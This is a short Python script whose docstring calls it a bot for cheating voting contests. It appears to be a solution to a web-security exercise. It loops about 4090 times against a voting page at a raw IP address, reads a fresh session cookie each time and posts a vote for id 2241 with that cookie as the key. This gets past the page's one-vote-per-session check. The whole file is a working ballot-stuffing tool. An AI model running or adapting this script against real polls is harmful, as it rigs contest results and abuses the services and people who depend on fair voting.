#!/usr/bin/python3
"""
Bot for cheating voting contests
This programs allow do 4096 times the input
of a specific data (as show in payload) and
a new cookie per insertion
"""
import requests

ses = requests.session()



for i in range(4090):
    response = ses.get('http://158.69.76.135/level1.php')
    #get the cookie data of the webpage
    session_cookies = ses.cookies
    
    for cookie in session_cookies:
        cookie_domain = cookie.domain
        cookie_name = cookie.name
        cookie_value = cookie.value
    # the data to input in the web page    
    payload = {
        'id':'2241',
        'holdthedoor':'Enviar',
        'key': cookie_value
    }
    #insert the data per iteration
    response = ses.post(url="http://158.69.76.135/level1.php",data=payload)
    #if prints 200, the conection was succesfull
    print(response.status_code)
